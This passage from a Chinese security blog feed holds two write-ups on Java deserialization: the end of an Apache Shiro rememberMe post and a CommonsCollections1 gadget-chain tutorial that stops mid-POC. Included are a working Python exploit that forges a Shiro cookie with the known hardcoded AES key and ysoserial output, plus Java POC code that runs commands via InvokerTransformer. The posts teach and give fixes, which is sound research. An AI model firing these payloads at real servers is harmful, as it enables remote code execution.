秘文的前16位</p></li><li><p>iv即为rememberMe解码后的前16个字节</p></li><li><p>有了key 和 vi 就可以解密到反序列化的数据了</p></li></ul><p>那POC的我们的加密流程就是：</p><ol><li>获取到 反序列化的数据</li><li>设置AES加密模式，使用AES.MODE_CBC的分块模式</li><li>设置硬编码的 key</li><li>使用随机数生成 16 字节的 iv</li><li>使用 iv + AES加密(反序列化数据) 拼接</li><li>最后base64加密全部内容</li></ol><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>这里主要导入的是这个版本的apache.commons</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;groupId&gt;org.apache.commons&lt;&#x2F;groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-collections4&lt;&#x2F;artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0&lt;&#x2F;version&gt;</span><br></pre></td></tr></table></figure><p>所以我们EXP利用CommonsCollections2 的利用链</p><p>主要依靠ysoserial生成利用的反序列化数据，然后根据加密的思路，把利用链加进去。</p><h2 id="Python代码"><a href="#Python代码" class="headerlink" title="Python代码"></a>Python代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    <span class="comment"># 这里使用CommonsCollections2模块</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'CommonsCollections2'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 明文需要按一定长度对齐，叫做块大小BlockSize 这个块大小是 block_size = 16 字节</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按照加密规则按一定长度对齐,如果不够要要做填充对齐</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露的key</span></span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># AES的CBC加密模式</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用uuid4基于随机数模块生成16字节的 iv向量</span></span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实例化一个加密方式为上述的对象</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用pad函数去处理yso的命令输出，生成的序列化数据</span></span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># iv 与 （序列化的AES加密后的数据）拼接， 最终输出生成rememberMe参数</span></span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dnslog</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'URLDNS'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># cc2的exp</span></span><br><span class="line">    payload = encode_rememberme(<span class="string">'/System/Applications/Calculator.app/Contents/MacOS/Calculator'</span>)</span><br><span class="line">    print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload.decode()))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dnslog的poc</span></span><br><span class="line">    payload1 = encode_rememberme(<span class="string">'http://ca4qki.dnslog.cn/'</span>)</span><br><span class="line">    print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload1.decode()))</span><br><span class="line"></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">"rememberMe"</span>: payload.decode()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requests.get(url=<span class="string">"http://127.0.0.1:8080/web_war/"</span>, cookies=cookie)</span><br></pre></td></tr></table></figure><h1 id="0x05-修复"><a href="#0x05-修复" class="headerlink" title="0x05 修复"></a>0x05 修复</h1><p>1.升级Shiro到最新版</p><p>2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p><p>3.WAF拦截Cookie中长度过大的rememberMe值</p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>本次是用ysoserial直接生成序列化内容，而且使用CommonsCollections2这个利用链，只是简单的直接利用，但是实际利用情况十分复杂，关乎java的版本还有各种组件的版本，想要一个完美的利用链还是得自己改造，准备下一篇文章，再研究各种利用链的情况，和改造各种利用链适配问题。</p><h1 id="0x07-小trips："><a href="#0x07-小trips：" class="headerlink" title="0x07 小trips："></a>0x07 小trips：</h1><p>如何搜索lib包里面的东西呢？</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIwOTEzMjMucG5n?x-oss-process=image/format,png" alt="image-20200902091323860"></p><p>双击shift , 调出全局搜索框就可以搜索到 jar包里的类了</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计：反序列化链CommonsCollections1详解</title>
      <link href="/2020/08/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BECommonsCollections1%E8%AF%A6%E8%A7%A3/"/>
      <url>/2020/08/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BECommonsCollections1%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p>Apache Commons Collections是一个第三方的基础类库，提供了很多强有力的数据结构类型并且实现了各种集合工具类，可以说是apache开源项目的重要组件。</p><p>CommonsCollection在java反序列化的源流中已经存在5年</p><p>今天介绍的CommonsCollections1，反序列化的第一种RCE序列化链</p><p>CommonsCollections1反序列化漏洞点仍然是commons-collections-3.1版本</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>maven的pom导入依赖</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"> &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><ul><li><p>此实验Java版本，在Java 8u71以后的版本中修改了触发的类，所以不支持此链的利用</p></li><li><p>MACBOOK</p></li><li><p>IDEA 2020</p></li></ul><p>此次实验代码：</p><p><a href="https://github.com/godzeo/javasec\_code\_study/tree/master/src/main/java/CommonCollections" target="_blank" rel="noopener">https://github.com/godzeo/javasec\_code\_study/tree/master/src/main/java/CommonCollections</a></p><h1 id="0x03-构造链-基础知识"><a href="#0x03-构造链-基础知识" class="headerlink" title="0x03 构造链-基础知识"></a>0x03 构造链-基础知识</h1><p>看完之后，大概会总结一下，需要了解这⼏个接⼝和类的知识点</p><p>首先要从Transformer类开始</p><h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer它只是⼀个接⼝，只有⼀个待实现的⽅法：它的作用我感觉就是总接口吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>TransformedMap在利用链中个人理解：是一个触发器，主要是后面类中的 实现类的Transformer（）方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>它是基本的数据类型Map类的做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个函数。</li><li>这个函数，就是⼀个实现了Transformer接⼝的类，这个类也就是链中导向下一环的入口。</li><li>第一个参数，要绑定修饰的map，第三个参数就是 valueTransformer就是要执行的Transformer接⼝的类。</li></ul><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><ul><li><p>ChainedTransformer就是实现了Transformer接⼝的⼀个类</p></li><li><p>它就可以承接下一步的操作。</p></li><li><p>它的主要作⽤：</p></li><li><p>将内部的多个Transformer串在⼀起</p></li><li><p>就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊</p></li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjUxNjQyMjEucG5n?x-oss-process=image/format,png" alt="image-20200825164221874"></p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"> .......</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><ul><li><p>ConstantTransformer是实现了Transformer接⼝的⼀个类</p><ul><li>简单就是你输入什么类，它就返回什么</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><ul><li>这个类就是代码执行的关键了</li><li>这个类的实现主要采用了反射的方法</li><li>简单的说：可以通过这个类反射实例化调用其他类其他方法（任意的方法，也就是命令执行）</li><li>只要参数可控，就是任意命令执行</li></ul><p>看一下代码，其实就是反射的代码，给封装到transform方法里面了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h1 id="0x04-简单的DEMO"><a href="#0x04-简单的DEMO" class="headerlink" title="0x04 简单的DEMO"></a>0x04 简单的DEMO</h1><p>下面是P牛写的dome</p><p>简单的利上面的知识点，构造了一个简单的链，达到命令执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonCollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new Object[]&#123;"open -a Calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span></span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">"zeo"</span>, <span class="string">"666"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析一下："><a href="#分析一下：" class="headerlink" title="分析一下："></a>分析一下：</h3><ol><li>实例化new Transformer的数组，构造中间的小链子</li><li>小链子主要有两个ConstantTransformer，InvokerTransformer 这个两个构造好后，放入刚刚提到的ChainedTransformer类里面，他们就是连起来的里面，大概就是下面这么个情况<img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjUxNjU4NTYucG5n?x-oss-process=image/format,png" alt="image-20200825165856011"></li><li>命令执行造好了，还有一个触发ChainedTransformer的方法，就是TransformedMap.decorate方法</li><li>实例化一个map对象，然后修饰绑定上transformerChain这个上面，每当有map有新元素进来的时候，就会触发上面的链</li><li>所以map对象put(“test”, “xxxx”)一下就会触发命令执行成功弹出了计算器</li></ol><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjUxNzA1MzgucG5n?x-oss-process=image/format,png" alt="image-20200825170538165"></p><h1 id="0x05-改写POC"><a href="#0x05-改写POC" class="headerlink" title="0x05 改写POC"></a>0x05 改写POC</h1><ul><li><p>上面的漏洞虽然触发了，但是其实是手动触发，没什么用的。</p></li><li><p>反序列化洞，你不得找到一个反序列化的点，来触发这个洞吗？</p></li><li><p>所以，目标是：找到⼀个类，它在反序列化的readObject逻辑⾥有类似的写⼊操作。</p></li><li><p>这个类就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sun.reflect.annotation.AnnotationInvocationHandler</span><br></pre></td></tr></table></figure><ul><li>反序列化的实现方法</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>发现主要的触发点在 memberValue.setValue()，这个方法可以往map对象里面赋值。</li><li>memberValue成员变量是map对象</li><li>所以最终的流程：</li></ul><p>把之前构造的transform链包装成一个Map对象</p><p>将它作为AnnotationInvocationHandler反序列后的memberValue</p><p>在readObject反序列化的时候，触发memberValue.setValue()</p><p>然后再触发TransformedMap里的transform()</p><p>最后实现命令执行。</p><h2 id="Transformer的利用也要改写"><a href="#Transformer的利用也要改写" class="headerlink" title="Transformer的利用也要改写"></a>Transformer的利用也要改写</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//利用InvokerTransformer的反射功能，构造可以序列化的 java.lang.Class 的 Runtime，class对象</span></span><br><span class="line">                <span class="comment">//利用反射构造命令执行</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new String[]&#123;"open -a Calculator"&#125;),</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>改写就是将 Runtime.getRuntime() 换成了 Runtime.class</p><p>原因是：java.lang.Runtime 对象不能反序列化</p><table><thead><tr><th>方法</th><th>类</th><th>可否序列化</th></tr></thead><tbody><tr><td>Runtime.getRuntime()</td><td>java.lang.Runtime</td><td>no</td></tr><tr><td>Runtime.class</td><td>java.lang.Class</td><td>yes</td></tr></tbody></table><p>重点：Java中不是所有对象都⽀持序列化，Java类 必须都实现了 java.io.Serializable 接⼝，才可以序列化，所以我们得换一个对象实现POC的改写</p><h1 id="0x06最终POC"><a href="#0x06最终POC" class="headerlink" title="0x06最终POC"></a>0x06最终POC</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 